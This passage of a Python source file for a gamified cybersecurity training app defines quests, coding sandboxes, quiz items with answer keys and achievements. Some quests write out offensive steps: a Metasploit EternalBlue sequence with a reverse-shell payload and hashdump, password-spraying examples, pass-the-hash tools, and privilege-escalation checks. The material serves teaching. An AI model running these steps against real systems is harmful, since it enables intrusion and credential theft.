    "narrative": "=== LOCATION: The Credential Vault ===\nPeople reuse passwords. That's my advantage.\nOne breach gives me credentials for 10 other sites.\nPassword spraying evades lockout policies.",
    "objective": "Document credential attack patterns.",
    "steps": [
      {
        "title": "Step 1 - Spraying",
        "body": "  1 password vs many accounts\n  Popular: Password1! Company2024! Welcome1!"
      },
      {
        "title": "Step 2 - Credential Reuse",
        "body": "  If you crack user:pass on one service...\n  Try SSH, RDP, email, VPN, web apps."
      },
      {
        "title": "Step 3 - Pass-the-Hash",
        "body": "  NTLM hashes authenticate WITHOUT cracking.\n  Tools: mimikatz, impacket, crackmapexec"
      }
    ],
    "task": "YOUR TASK:\n  Create ~/ops/reports/credential_attacks.txt\n  Include: spray patterns, reuse strategies, defenses.\n\nPassword Attacks complete. BOSS FIGHT awaits."
  },
  {
    "id": "ex01",
    "tree": "exploit",
    "tier": 1,
    "xp": 35,
    "title": "Metasploit Basics",
    "brief": "The exploitation framework. Load, configure, fire.",
    "narrative": "=== LOCATION: The Exploitation Range ===\nMetasploit is the Swiss Army knife of exploitation.\nFind a vuln, load the exploit, set target, set payload, fire.\nEvery open port and version number I gathered - now I search for exploits.",
    "objective": "Learn the Metasploit workflow.",
    "steps": [
      {
        "title": "Step 1 - Launch",
        "body": "  msfconsole\n  search eternalblue\n  use exploit/windows/smb/ms17_010_eternalblue\n  show options"
      },
      {
        "title": "Step 2 - Configure",
        "body": "  set RHOSTS 10.0.0.1\n  set PAYLOAD windows/x64/meterpreter/reverse_tcp\n  set LHOST YOUR_IP\n  exploit"
      },
      {
        "title": "Step 3 - Post-Exploitation",
        "body": "  sysinfo | getuid | hashdump | shell"
      }
    ],
    "task": "YOUR TASK:\n  Create ~/ops/notes/metasploit_ref.txt with\n  full command sequence for one exploit.\n\n  ONLY against Metasploitable or YOUR lab targets."
  },
  {
    "id": "ex02",
    "tree": "exploit",
    "tier": 2,
    "xp": 50,
    "title": "Privilege Escalation",
    "brief": "User shell to root. Enumerate, exploit, escalate.",
    "narrative": "=== LOCATION: The Escalation Engine Room ===\nI'm in. But I'm nobody. Root is the goal.\nBetween me and root: sudo misconfigs, SUID binaries,\nwritable cron scripts, kernel exploits.\nWork through the checklist.",
    "objective": "Run a privesc checklist and document findings.",
    "steps": [
      {
        "title": "Step 1 - The Checklist",
        "body": "  sudo -l  -> Can I sudo anything?\n  find / -perm -4000 2>/dev/null  -> SUID\n  cat /etc/crontab  -> Root crons\n  uname -a  -> Kernel version"
      },
      {
        "title": "Step 2 - LinPEAS",
        "body": "  Download: github.com/carlospolop/PEASS-ng\n  chmod +x linpeas.sh && ./linpeas.sh"
      },
      {
        "title": "Step 3 - Common Paths",
        "body": "  SUID on GTFOBins -> root shell\n  Writable cron script -> inject commands\n  Kernel exploit -> search exploit-db.com"
      }
    ],
    "task": "YOUR TASK:\n  Create ~/ops/reports/privesc_audit.txt\n  Include: sudo output, SUID files, crons, kernel version.\n\nExploitation complete. BOSS FIGHT awaits."
  },
  {
    "id": "def01",
    "tree": "defense",
    "tier": 1,
    "xp": 30,
    "title": "Firewall Architect",
    "brief": "Build network defenses with UFW and iptables.",
    "narrative": "=== LOCATION: The Defense Command Center ===\nTime to switch sides. I know how attackers get in.\nNow I build the walls that keep them out.\nA misconfigured firewall is worse than none.",
    "objective": "Configure firewall rules and document defenses.",
    "steps": [
      {
        "title": "Step 1 - UFW",
        "body": "  sudo ufw enable\n  sudo ufw allow 22/tcp\n  sudo ufw deny 23/tcp\n  sudo ufw status verbose"
      },
      {
        "title": "Step 2 - iptables",
        "body": "  sudo iptables -L -n -v\n  sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT\n  sudo iptables -P INPUT DROP  -> Default deny"
      },
      {
        "title": "Step 3 - Defense in Depth",
        "body": "  Firewall -> IDS/IPS -> Endpoint -> App security -> Data protection"
      }
    ],
    "task": "YOUR TASK:\n  Create ~/ops/reports/firewall_rules.txt\n  Document: current rules, recommended changes, defense strategy."
  },
  {
    "id": "def02",
    "tree": "defense",
    "tier": 2,
    "xp": 45,
    "title": "Log Analyst",
    "brief": "Parse logs, detect attacks, build detection rules.",
    "narrative": "=== LOCATION: The SOC Floor ===\nLogs tell the story of every attack.\nFailed logins, unusual processes, suspicious connections.\nMy job: read the story faster than the attacker writes it.",
    "objective": "Analyze auth logs and build alerts.",
    "steps": [
      {
        "title": "Step 1 - Key Logs",
        "body": "  /var/log/auth.log -> Authentication\n  /var/log/syslog -> System\n  /var/log/kern.log -> Kernel"
      },
      {
        "title": "Step 2 - Hunt Brute Force",
        "body": "  grep 'Failed password' /var/log/auth.log | \\\n    awk '{print $(NF-3)}' | sort | uniq -c | sort -rn"
      },
      {
        "title": "Step 3 - fail2ban",
        "body": "  sudo apt install fail2ban\n  Configure: maxretry, findtime, bantime"
      }
    ],
    "task": "YOUR TASK:\n  Create ~/ops/reports/log_analysis.txt\n  Include: failed login counts by IP, suspicious patterns, rules.\n\nDefensive Security complete. BOSS FIGHT awaits."
  },
  {
    "id": "siem01",
    "tree": "siem",
    "tier": 1,
    "xp": 30,
    "title": "SIEM Foundations",
    "brief": "Log aggregation, correlation, and alerting.",
    "narrative": "=== LOCATION: The Detection Lab ===\nA SIEM collects logs from every source and correlates them.\nOne failed login is noise. 500 from the same IP in 10 minutes\nis a brute force attack. The SIEM sees the pattern.",
    "objective": "Learn SIEM concepts and design correlation rules.",
    "steps": [
      {
        "title": "Step 1 - What is a SIEM?",
        "body": "  Collects logs -> Normalizes -> Correlates -> Alerts\n  Popular: Splunk, ELK, Wazuh, QRadar, Sentinel"
      },
      {
        "title": "Step 2 - Log Sources",
        "body": "  Firewall, VPN, DNS, Windows Events, syslog\n  Cloud: AWS CloudTrail, Azure Activity Log\n  Endpoint: EDR telemetry, AV alerts"
      },
      {
        "title": "Step 3 - Correlation Rules",
        "body": "  IF: 5+ failed logins from same IP in 5 min\n  THEN: Alert - brute force\n  IF: success AFTER 10+ failures\n  THEN: Alert - possible compromise"
      }
    ],
    "task": "YOUR TASK:\n  Create ~/ops/reports/siem_rules.txt\n  Write 3 correlation rules with trigger, severity, response."
  },
  {
    "id": "siem02",
    "tree": "siem",
    "tier": 2,
    "xp": 45,
    "title": "Wazuh Defender",
    "brief": "Deploy and configure an open-source SIEM.",
    "narrative": "=== LOCATION: The SIEM Operations Center ===\nTheory done. Now deploy a real SIEM.\nWazuh is open-source, free, and used by real SOC teams.",
    "objective": "Study Wazuh architecture and write custom rules.",
    "steps": [
      {
        "title": "Step 1 - Architecture",
        "body": "  Manager: central server\n  Agent: on endpoints\n  Indexer: stores events (OpenSearch)\n  Dashboard: web UI"
      },
      {
        "title": "Step 2 - Features",
        "body": "  File Integrity Monitoring\n  Rootkit detection\n  Log correlation\n  MITRE ATT&CK mapping"
      },
      {
        "title": "Step 3 - Custom Rules",
        "body": "  XML-based rules\n  Match patterns -> trigger alerts at severity levels"
      }
    ],
    "task": "YOUR TASK:\n  Create ~/ops/reports/siem_deployment.txt\n  Include: architecture, log sources, 3 custom rules, playbooks.\n\nSIEM complete. BOSS FIGHT awaits."
  },
  {
    "id": "gov01",
    "tree": "governance",
    "tier": 1,
    "xp": 25,
    "title": "NIST & Risk",
    "brief": "NIST CSF, risk assessment, security frameworks.",
    "narrative": "=== LOCATION: The Governance Library ===\nFrameworks tell you WHAT to protect and HOW to measure it.\nNIST CSF: Identify, Protect, Detect, Respond, Recover.\nEvery security program maps to these five words.",
    "objective": "Understand NIST CSF and build a risk assessment.",
    "steps": [
      {
        "title": "Step 1 - NIST CSF",
        "body": "  IDENTIFY -> Asset inventory, risk assessment\n  PROTECT -> Access control, encryption\n  DETECT -> Monitoring, SIEM\n  RESPOND -> Incident response\n  RECOVER -> Backup, DR, lessons learned"
      },
      {
        "title": "Step 2 - Risk Assessment",
        "body": "  Risk = Threat x Vulnerability x Impact\n  ALE = SLE x ARO"
      },
      {
        "title": "Step 3 - Other Frameworks",
        "body": "  ISO 27001 | CIS Controls | MITRE ATT&CK | PCI DSS"
      }
    ],
    "task": "YOUR TASK:\n  Create ~/ops/reports/risk_assessment.txt\n  Pick 3 assets. For each: threats, vulns, impact, controls."
  },
  {
    "id": "gov02",
    "tree": "governance",
    "tier": 2,
    "xp": 35,
    "title": "CVE Hunter",
    "brief": "Navigate CVEs, CVSS scoring, vulnerability databases.",
    "narrative": "=== LOCATION: The Vulnerability Database ===\nEvery known vuln gets a CVE number.\nCVE-2021-44228 - Log4Shell. CVSS 10.0.\nI need to read these databases like a newspaper.",
    "objective": "Research real CVEs and understand CVSS scoring.",
    "steps": [
      {
        "title": "Step 1 - CVSS Scoring",
        "body": "  0.0=None | 0.1-3.9=Low | 4.0-6.9=Medium\n  7.0-8.9=High | 9.0-10.0=Critical"
      },
      {
        "title": "Step 2 - Famous CVEs",
        "body": "  CVE-2021-44228 Log4Shell (10.0)\n  CVE-2017-0144 EternalBlue (8.1)\n  CVE-2014-0160 Heartbleed (7.5)\n  CVE-2019-0708 BlueKeep (9.8)"
      },
      {
        "title": "Step 3 - Research Tools",
        "body": "  nvd.nist.gov | cve.mitre.org | exploit-db.com"
      }
    ],
    "task": "YOUR TASK:\n  Create ~/ops/reports/cve_research.txt\n  Research 3 CVEs: ID, CVSS, software, impact, patch status.\n\nFrameworks complete. BOSS FIGHT awaits."
  },
  {
    "id": "tool01",
    "tree": "tools",
    "tier": 1,
    "xp": 25,
    "title": "Tool Arsenal",
    "brief": "Master the essential security toolkit.",
    "narrative": "=== LOCATION: The Armory ===\nA hacker is only as good as their tools.\nBut tools without understanding are dangerous.\nKnow WHAT each does, WHEN to use it, and WHY.",
    "objective": "Build a tool reference guide.",
    "steps": [
      {
        "title": "Step 1 - Recon Tools",
        "body": "  nmap - port scanning\n  theHarvester - email/subdomain enum\n  Shodan - exposed devices\n  Recon-ng - modular recon"
      },
      {
        "title": "Step 2 - Exploitation",
        "body": "  Metasploit | Burp Suite | sqlmap | Impacket"
      },
      {
        "title": "Step 3 - Defense",
        "body": "  Wireshark | Suricata (IDS/IPS) | Wazuh (SIEM) | YARA"
      }
    ],
    "task": "YOUR TASK:\n  Create ~/ops/notes/tool_reference.txt\n  For each tool: name, purpose, one example command."
  },
  {
    "id": "tool02",
    "tree": "tools",
    "tier": 2,
    "xp": 40,
    "title": "AI in Security",
    "brief": "How AI is used in attack and defense.",
    "narrative": "=== LOCATION: The AI Research Lab ===\nAI is changing both sides. Attackers use it for phishing and deepfakes.\nDefenders use it for anomaly detection and threat hunting.\nUnderstanding AI's role is no longer optional.",
    "objective": "Research AI's role in offensive and defensive security.",
    "steps": [
      {
        "title": "Step 1 - AI in Offense",
        "body": "  AI phishing emails | Deepfakes\n  Automated vuln discovery | Data poisoning"
      },
      {
        "title": "Step 2 - AI in Defense",
        "body": "  Behavioral anomaly detection\n  Automated alert triage\n  Malware classification"
      },
      {
        "title": "Step 3 - AI Risks",
        "body": "  Prompt injection | Data poisoning\n  Model theft | Training data leakage"
      }
    ],
    "task": "YOUR TASK:\n  Create ~/ops/reports/ai_security.txt\n  3 offensive uses, 3 defensive uses, 3 AI-specific risks.\n\nTools & AI complete. BOSS FIGHT awaits."
  }
]

PYTHON_QUESTS = [
  {
    "id": "py01",
    "tree": "python",
    "tier": 1,
    "xp": 20,
    "title": "Variables & Output",
    "brief": "Print, f-strings, types, input.",
    "narrative": "=== LOCATION: The Python Terminal ===\nEvery security tool starts with a print statement.\nVariables hold data. F-strings format output.",
    "objective": "Write your first Python security-themed script.",
    "sandbox": "target_ip = '192.168.1.100'\nport = 22\nservice = 'SSH'\nis_open = True\nprint(f'Target: {target_ip}')\nprint(f'Port {port} ({service}): {\"OPEN\" if is_open else \"closed\"}')\nname = input('Enter your hacker alias: ')\nprint(f'Welcome, {name}.')\n",
    "steps": [
      {
        "title": "Step 1 - Variables",
        "body": "  ip='10.0.0.1'  port=22  cvss=9.8  is_vuln=True"
      },
      {
        "title": "Step 2 - F-Strings",
        "body": "  print(f'Port {port} on {ip}')"
      }
    ],
    "task": "Run the sandbox. Modify the target IP and port."
  },
  {
    "id": "py02",
    "tree": "python",
    "tier": 1,
    "xp": 20,
    "title": "Lists & Strings",
    "brief": "Collections and text manipulation.",
    "narrative": "=== LOCATION: The Data Workshop ===\nSecurity data comes in lists: ports, IPs, CVEs, usernames.\nI need to store, filter, and search them fast.",
    "objective": "Work with lists of ports and string operations.",
    "sandbox": "ports = [22, 80, 443, 8080, 3306]\nrisky = [p for p in ports if p in [22, 23, 3389, 21]]\nprint(f'Open ports: {ports}')\nprint(f'Risky ports: {risky}')\nlog = 'Failed password for admin from 10.0.0.5 port 22'\nparts = log.split()\nprint(f'Attacker IP: {parts[5]}')\n",
    "steps": [
      {
        "title": "Step 1 - Lists",
        "body": "  append() remove() sort() len()"
      },
      {
        "title": "Step 2 - Strings",
        "body": "  split() strip() 'x' in line  replace()"
      }
    ],
    "task": "Add IP extraction from 3 different log lines."
  },
  {
    "id": "py03",
    "tree": "python",
    "tier": 1,
    "xp": 25,
    "title": "Loops & Logic",
    "brief": "For loops, while loops, conditionals.",
    "narrative": "=== LOCATION: The Logic Engine ===\nScanning 65,535 ports by hand? No. That's what loops are for.\nChecking each against a condition? That's if/else.",
    "objective": "Build a port scanner loop and CVSS classifier.",
    "sandbox": "ports = [21, 22, 80, 443, 3306, 8080]\nfor port in ports:\n    if port < 1024: status = 'well-known'\n    elif port < 49152: status = 'registered'\n    else: status = 'dynamic'\n    print(f'  Port {port:5d}: {status}')\n\ncvss = 9.1\nif cvss >= 9.0: sev = 'CRITICAL'\nelif cvss >= 7.0: sev = 'HIGH'\nelif cvss >= 4.0: sev = 'MEDIUM'\nelse: sev = 'LOW'\nprint(f'CVSS {cvss} = {sev}')\n",
    "steps": [
      {
        "title": "Step 1 - For Loops",
        "body": "  for item in collection: do_something()"
      },
      {
        "title": "Step 2 - Conditionals",
        "body": "  if / elif / else"
      }
    ],
    "task": "Extend: add a while loop simulating brute force."
  },
  {
    "id": "py04",
    "tree": "python",
    "tier": 2,
    "xp": 40,
    "title": "Functions & Errors",
    "brief": "Reusable code and error handling.",
    "narrative": "=== LOCATION: The Function Factory ===\nFunctions turn code into tools. Error handling makes them reliable.\nA script that crashes on bad input is useless.",
    "objective": "Write named functions with try/except.",
    "sandbox": "def classify_port(port):\n    if port < 1024: return 'well-known'\n    elif port < 49152: return 'registered'\n    return 'dynamic'\n\ndef safe_int(prompt):\n    try: return int(input(prompt))\n    except ValueError:\n        print('  [!] Not valid.')\n        return None\n\nfor p in [21, 80, 3306, 50000]:\n    print(f'Port {p}: {classify_port(p)}')\n",
    "steps": [
      {
        "title": "Step 1 - Functions",
        "body": "  def name(param): return result"
      },
      {
        "title": "Step 2 - Error Handling",
        "body": "  try: ... except Error: handle()"
      }
    ],
    "task": "Add a cvss_severity() function."
  },
  {
    "id": "py05",
    "tree": "python",
    "tier": 2,
    "xp": 45,
    "title": "Data Structures",
    "brief": "Dicts, comprehensions, structured data.",
    "narrative": "=== LOCATION: The Data Model Room ===\nHosts have IPs and ports, CVEs have scores.\nPython dicts model all of it cleanly.",
    "objective": "Model scan results as dicts.",
    "sandbox": "host = {'ip':'192.168.1.100','hostname':'web-01','ports':[22,80,443],'cves':['CVE-2021-44228']}\nprint(f\"Host: {host['hostname']} ({host['ip']})\")\nprint(f\"Ports: {', '.join(str(p) for p in host['ports'])}\")\nrisky = [p for p in host['ports'] if p in [22,3389,23]]\nprint(f'Risky: {risky}')\n",
    "steps": [
      {
        "title": "Step 1 - Dicts",
        "body": "  host['status']='up'\n  host.get('os','Unknown')"
      },
      {
        "title": "Step 2 - Comprehensions",
        "body": "  [p for p in ports if p<1024]\n  {p:'open' for p in ports}"
      }
    ],
    "task": "Build a 3-host network inventory."
  },
  {
    "id": "py06",
    "tree": "python",
    "tier": 2,
    "xp": 40,
    "title": "Files & Modules",
    "brief": "Read logs, write reports, standard library.",
    "narrative": "=== LOCATION: The Library and Archive ===\nReal tools save to disk, read configs, hash passwords.\nPython's standard library gives me all of this free.",
    "objective": "Use file I/O, JSON, hashlib, and secrets.",
    "sandbox": "import json, hashlib, secrets\nfrom datetime import datetime\nscan = {'target':'192.168.1.100','timestamp':str(datetime.now()),'ports':[22,80,443]}\nwith open('scan_result.json','w') as f: json.dump(scan,f,indent=2)\nprint('Saved scan_result.json')\nsha = hashlib.sha256(b'password123').hexdigest()\nprint(f'SHA256: {sha}')\nprint(f'Token: {secrets.token_hex(16)}')\n",
    "steps": [
      {
        "title": "Step 1 - File I/O",
        "body": "  with open('file','w') as f: write\n  with open('file','r') as f: read"
      },
      {
        "title": "Step 2 - JSON/Hashing",
        "body": "  json.dump/load\n  hashlib.sha256()\n  secrets.token_hex()"
      }
    ],
    "task": "Add a risk_score field, re-save, reload, verify."
  },
  {
    "id": "py07",
    "tree": "python",
    "tier": 3,
    "xp": 55,
    "title": "OOP & Advanced",
    "brief": "Classes, decorators, generators.",
    "narrative": "=== LOCATION: The Engineering Workshop ===\nScripts are one-off. Classes are reusable components.\nDecorators add behavior without modifying code.",
    "objective": "Build class hierarchies with inheritance.",
    "sandbox": "import time\ndef timer(func):\n    def wrapper(*a,**k):\n        s=time.time(); r=func(*a,**k)\n        print(f'  [{func.__name__}] {time.time()-s:.4f}s'); return r\n    return wrapper\nclass Scanner:\n    def __init__(self,t): self.target=t; self.results=[]\n    def report(self):\n        print(f'Scan: {self.target}')\n        for r in self.results: print(f'  {r}')\nclass PortScanner(Scanner):\n    @timer\n    def scan(self,ports):\n        for p in ports: self.results.append(f'Port {p}: open')\nps = PortScanner('192.168.1.100')\nps.scan([22,80,443])\nps.report()\n",
    "steps": [
      {
        "title": "Step 1 - Classes",
        "body": "  class Name: def __init__(self): ..."
      },
      {
        "title": "Step 2 - Inheritance",
        "body": "  class Child(Parent): inherits all methods"
      }
    ],
    "task": "Add a VulnScanner class that inherits Scanner."
  },
  {
    "id": "py08",
    "tree": "python",
    "tier": 3,
    "xp": 70,
    "title": "Build a Security Tool",
    "brief": "Capstone: complete tool from scratch.",
    "narrative": "=== LOCATION: The Tool Forge - CAPSTONE ===\nEverything comes together. Variables, functions, classes,\nfile I/O, error handling. Choose a weapon and build it.",
    "objective": "Build a complete security tool using all Python skills.",
    "sandbox": "import secrets, string, json\nfrom datetime import datetime\ndef gen_pw(length=20):\n    chars=string.ascii_letters+string.digits+'!@#$%^&*'\n    return ''.join(secrets.choice(chars) for _ in range(length))\ndef score_pw(pw):\n    checks={'length':len(pw)>=12,'upper':any(c.isupper() for c in pw),'digits':any(c.isdigit() for c in pw),'special':any(c in '!@#$%^&*' for c in pw)}\n    s=sum(checks.values())\n    return ['WEAK','FAIR','GOOD','STRONG','PERFECT'][s],s\nfor i in range(5):\n    pw=gen_pw()\n    g,s=score_pw(pw)\n    print(f'  {pw}  [{g} {s}/4]')\n",
    "steps": [
      {
        "title": "Step 1 - Choose Project",
        "body": "  A) LOG ANALYZER  B) NETWORK SCANNER  C) HASH CRACKER"
      },
      {
        "title": "Step 2 - Requirements",
        "body": "  1 class, file I/O, try/except, 3+ modules, main()"
      }
    ],
    "task": "Build it, run it. This is your portfolio piece."
  }
]

ALL_QUESTS = ALL_QUESTS + PYTHON_QUESTS


# ═══════════════════════════════════════════════════════════════════════════
# BOSS FIGHTS (one per tree — quiz format, 70% to pass)
# ═══════════════════════════════════════════════════════════════════════════

BOSS_FIGHTS = [
    {"id":"boss_linux","tree":"linux","title":"LINUX BOSS - The Root Guardian","xp":50,"questions":[
        {"q":"Which command shows your current directory?","options":["ls","pwd","cd","whoami"],"answer":1},
        {"q":"Which directory stores system config files?","options":["/home","/tmp","/etc","/bin"],"answer":2},
        {"q":"chmod 600 means:","options":["Owner:rw Others:none","All:rw","Owner:rwx","Everyone:read"],"answer":0},
        {"q":"SUID bit causes the file to run as:","options":["Current user","File owner","Root always","No one"],"answer":1},
        {"q":"Find SUID files command:","options":["ls -suid","find / -perm -4000","grep suid /","chmod -4000"],"answer":1},
        {"q":"Password hashes are stored in:","options":["/etc/passwd","/etc/shadow","/etc/crypt","/var/shadow"],"answer":1},
        {"q":"sudo -l shows:","options":["Last login","Load average","Allowed sudo commands","Listening ports"],"answer":2},
        {"q":"Default world-writable temp directory:","options":["/etc","/home","/tmp","/root"],"answer":2},
        {"q":"chmod +x does:","options":["Delete","Make executable","Encrypt","Hide"],"answer":1},
        {"q":"Which file lists all user accounts?","options":["/etc/shadow","/etc/passwd","/etc/users","/var/users"],"answer":1},
    ]},
    {"id":"boss_networking","tree":"networking","title":"NETWORKING BOSS - The Packet Warden","xp":50,"questions":[
        {"q":"TCP operates at OSI Layer:","options":["2","3","4","7"],"answer":2},
        {"q":"SSH default port:","options":["21","22","23","25"],"answer":1},
        {"q":"nmap -sS performs:","options":["Full connect","UDP scan","SYN stealth scan","Ping sweep"],"answer":2},
        {"q":"DNS resolves:","options":["IPs to MACs","Hostnames to IPs","MACs to IPs","Ports to services"],"answer":1},
        {"q":"/24 subnet has how many addresses?","options":["24","128","256","1024"],"answer":2},
        {"q":"SMB default port:","options":["139","389","443","445"],"answer":3},
        {"q":"A SYN packet initiates:","options":["Session teardown","Data transfer","Connection request","DNS query"],"answer":2},
        {"q":"Which tool captures packets?","options":["nmap","tcpdump","gobuster","john"],"answer":1},
    ]},
    {"id":"boss_crypto","tree":"crypto","title":"CRYPTO BOSS - The Cipher Master","xp":40,"questions":[
        {"q":"The 'I' in CIA Triad:","options":["Intelligence","Integrity","Identity","Interop"],"answer":1},
        {"q":"$6$ in /etc/shadow indicates:","options":["MD5","SHA-256","SHA-512","bcrypt"],"answer":2},
        {"q":"Base64 encoding is:","options":["Encryption","Hashing","Format conversion","Compression"],"answer":2},
        {"q":"AES-256 is:","options":["Asymmetric","Symmetric","Hashing","Encoding"],"answer":1},
        {"q":"RSA uses:","options":["One shared key","Public/private key pair","No keys","Hash keys"],"answer":1},
        {"q":"SHA-256 is:","options":["Reversible","One-way","Encryption","Encoding"],"answer":1},
    ]},
    {"id":"boss_recon","tree":"recon","title":"RECON BOSS - The Shadow Watcher","xp":40,"questions":[
        {"q":"OSINT stands for:","options":["Open Source Intelligence","Operating System Integration","Online Security Interface","Offensive Security Intel"],"answer":0},
        {"q":"Zone transfer uses:","options":["HTTP","AXFR","FTP","SNMP"],"answer":1},
        {"q":"Google dorking is:","options":["Hacking Google","Advanced search queries","DNS poisoning","ARP spoofing"],"answer":1},
        {"q":"Shodan searches for:","options":["Websites","Exposed devices","Passwords","Social media"],"answer":1},
        {"q":"WHOIS reveals:","options":["Passwords","Domain registration info","Open ports","Vulnerabilities"],"answer":1},
    ]},
    {"id":"boss_webhack","tree":"webhack","title":"WEB BOSS - The Injection Demon","xp":45,"questions":[
        {"q":"SQL injection works by:","options":["Injecting CSS","Embedding SQL in input","DDoS","Brute force"],"answer":1},
        {"q":"XSS stands for:","options":["Cross-System Scripting","Cross-Site Scripting","XML Script Service","Extra Secure Socket"],"answer":1},
        {"q":"robots.txt is useful because:","options":["Blocks crawlers","Lists hidden paths","Shows ports","Reveals DB"],"answer":1},
        {"q":"Parameterized queries prevent:","options":["XSS","Path traversal","SQL injection","CSRF"],"answer":2},
        {"q":"OWASP Top 10 #1 (2021):","options":["Injection","Broken Access Control","XSS","SSRF"],"answer":1},
        {"q":"Burp Suite is for:","options":["Port scanning","Web traffic interception","Password cracking","DNS"],"answer":1},
    ]},
    {"id":"boss_passwords","tree":"passwords","title":"PASSWORD BOSS - The Key Breaker","xp":40,"questions":[
        {"q":"Hydra is for:","options":["Hash cracking","Online brute force","Packet capture","Web scanning"],"answer":1},
        {"q":"Password spraying tries:","options":["Many pw vs 1 account","1 pw vs many accounts","Random combos","Dictionary only"],"answer":1},
        {"q":"MFA stands for:","options":["Multiple File Access","Multi-Factor Authentication","Main Firewall Action","Managed Agent"],"answer":1},
        {"q":"rockyou.txt contains:","options":["Exploits","Real leaked passwords","IP addresses","Hash algorithms"],"answer":1},
        {"q":"fail2ban does:","options":["Cracks passwords","Blocks IPs after failures","Encrypts traffic","Scans ports"],"answer":1},
    ]},
    {"id":"boss_exploit","tree":"exploit","title":"EXPLOIT BOSS - The Zero-Day Dragon","xp":50,"questions":[
        {"q":"Metasploit RHOSTS sets:","options":["Your IP","Target IP","Gateway","DNS server"],"answer":1},
        {"q":"Meterpreter hashdump does:","options":["Deletes files","Dumps password hashes","Scans ports","Creates users"],"answer":1},
        {"q":"SUID privesc works because:","options":["File runs as owner","File deletes itself","File encrypted","No permissions"],"answer":0},
        {"q":"LinPEAS is:","options":["Web scanner","Privesc enum script","Firewall tool","SIEM"],"answer":1},
        {"q":"EternalBlue targets:","options":["HTTP","SSH","SMB","DNS"],"answer":2},
    ]},
    {"id":"boss_defense","tree":"defense","title":"DEFENSE BOSS - The Iron Wall","xp":45,"questions":[
        {"q":"Defense in depth means:","options":["One strong firewall","Multiple layered controls","Deep packet inspection","Full disk encryption"],"answer":1},
        {"q":"UFW stands for:","options":["Unified Firewall","Uncomplicated Firewall","Universal File Watcher","User Firewall Utility"],"answer":1},
        {"q":"iptables default DROP means:","options":["Allow all","Deny unless allowed","Log all","Redirect all"],"answer":1},
        {"q":"IDS stands for:","options":["Internet Data Service","Intrusion Detection System","Internal DNS","Identity Scanner"],"answer":1},
        {"q":"Failed logins are in:","options":["/var/log/syslog","/var/log/auth.log","/var/log/kern.log","/var/log/boot.log"],"answer":1},
    ]},
    {"id":"boss_siem","tree":"siem","title":"SIEM BOSS - The All-Seeing Eye","xp":45,"questions":[
        {"q":"SIEM stands for:","options":["Security Info & Event Mgmt","System Integration Monitor","Secure Endpoint Manager","Security Incident Module"],"answer":0},
        {"q":"A correlation rule:","options":["Blocks traffic","Links events into alerts","Encrypts logs","Backs up data"],"answer":1},
        {"q":"Wazuh is:","options":["A firewall","Open-source SIEM","Password cracker","Web scanner"],"answer":1},
        {"q":"FIM stands for:","options":["Firewall Integration","File Integrity Monitoring","Fast Incident Mgmt","Forensic Image Mgr"],"answer":1},
        {"q":"MITRE ATT&CK is:","options":["Vuln scanner","Adversary tactics framework","SIEM product","Encryption algorithm"],"answer":1},
    ]},
    {"id":"boss_governance","tree":"governance","title":"GOVERNANCE BOSS - The Compliance Oracle","xp":40,"questions":[
        {"q":"NIST CSF has how many functions?","options":["3","5","7","10"],"answer":1},
        {"q":"CVSS Critical range:","options":["7.0-8.9","8.0-9.5","9.0-10.0","10.0 only"],"answer":2},
        {"q":"CVE-2021-44228 is:","options":["EternalBlue","Log4Shell","Heartbleed","BlueKeep"],"answer":1},
        {"q":"A zero-day is:","options":["Patched vuln","No known fix yet","CVSS 0","Day-zero disclosure"],"answer":1},
        {"q":"Least privilege means:","options":["Minimum access needed","No access","Admin for all","Role-based only"],"answer":0},
    ]},
    {"id":"boss_tools","tree":"tools","title":"TOOLS BOSS - The Arsenal Master","xp":40,"questions":[
        {"q":"nmap is primarily for:","options":["Password cracking","Port scanning","Log analysis","Encryption"],"answer":1},
        {"q":"Burp Suite intercepts:","options":["Packets","Web HTTP traffic","System calls","DNS"],"answer":1},
        {"q":"YARA is for:","options":["Port scanning","Malware pattern matching","Password cracking","Monitoring"],"answer":1},
        {"q":"Suricata is:","options":["SIEM","IDS/IPS","Web scanner","Password tool"],"answer":1},
        {"q":"Prompt injection targets:","options":["SQL databases","AI/LLM systems","Firewalls","Operating systems"],"answer":1},
    ]},
    {"id":"boss_python","tree":"python","title":"PYTHON BOSS - The Code Serpent","xp":50,"questions":[
        {"q":"Print output in Python:","options":["echo()","printf()","print()","output()"],"answer":2},
        {"q":"f-string syntax:","options":["f'Hello {name}'","'Hello'.format(name)","format('Hello',name)","Hello+name"],"answer":0},
        {"q":"Filter ports > 1024:","options":["list(p>1024)","[p for p in ports if p>1024]","{p:1024}","(p for 1024)"],"answer":1},
        {"q":"Handle ValueError:","options":["if/else","try/except ValueError","for/while","raise ValueError"],"answer":1},
        {"q":"__init__ is:","options":["Destructor","Constructor","Iterator","Decorator"],"answer":1},
        {"q":"Safely open a file:","options":["file=open('f')","with open('f') as f:","f=File('f')","read('f')"],"answer":1},
        {"q":"A decorator does:","options":["Deletes function","Wraps with extra behavior","Creates class","Handles errors"],"answer":1},
        {"q":"json.dump() does:","options":["Reads JSON","Writes Python as JSON","Deletes JSON","Validates"],"answer":1},
    ]},
]


# ═══════════════════════════════════════════════════════════════════════════
# ACHIEVEMENTS
# ═══════════════════════════════════════════════════════════════════════════

def get_achievements(save):
    c = save.get("completed_quests", [])
    e = save.get("exam_scores", {})
    s = save.get("side_quests_done", [])
    def tree_done(tree):
        return all(q["id"] in c for q in ALL_QUESTS if q["tree"] == tree)
    return [
        {"id":"first","name":"First Blood","desc":"Complete your first quest","icon":"X","check": lambda: len(c)>=1},
        {"id":"five","name":"Grinding","desc":"Complete 5 quests","icon":"5","check": lambda: len(c)>=5},
        {"id":"ten","name":"Double Digits","desc":"Complete 10 quests","icon":"10","check": lambda: len(c)>=10},
        {"id":"twenty","name":"Unstoppable","desc":"Complete 20 quests","icon":"!","check": lambda: len(c)>=20},
        {"id":"all","name":"Completionist","desc":"Complete every quest","icon":"*","check": lambda: len(c)>=len(ALL_QUESTS)},
        {"id":"boss1","name":"Boss Slayer","desc":"Defeat a boss fight","icon":"B","check": lambda: len(s)>=1},
        {"id":"bossall","name":"Dragon Slayer","desc":"Defeat all bosses","icon":"D","check": lambda: len(s)>=len(BOSS_FIGHTS)},
        {"id":"perfect","name":"Perfect Score","desc":"100% on any boss","icon":"P","check": lambda: any(v==100 for v in e.values())},
        {"id":"linux","name":"Penguin Master","desc":"All Linux quests","icon":"L","check": lambda: tree_done("linux")},
